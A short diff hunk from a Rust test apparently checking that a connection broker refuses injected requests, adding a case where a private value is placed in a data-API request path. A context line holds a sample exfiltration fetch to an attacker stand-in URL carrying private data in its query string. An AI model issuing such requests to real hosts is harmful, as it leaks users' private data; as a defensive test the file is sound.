@@ -317,6 +317,11 @@ async fn custom_connection_broker_records_refusals_blocks_injection_and_captures
                 "web.fetch",
                 json!({"url":"https://attacker.example/?d=private"}),
             ),
+            // A keyless native read puts its model-chosen id in the request path.
+            (
+                "defillama.read",
+                json!({"route":"protocol","id":"private-value"}),
+            ),
             ("mcp.call", arguments),
         ] {
             let refused = broker_request(&socket, broker.token(), method, params).await;
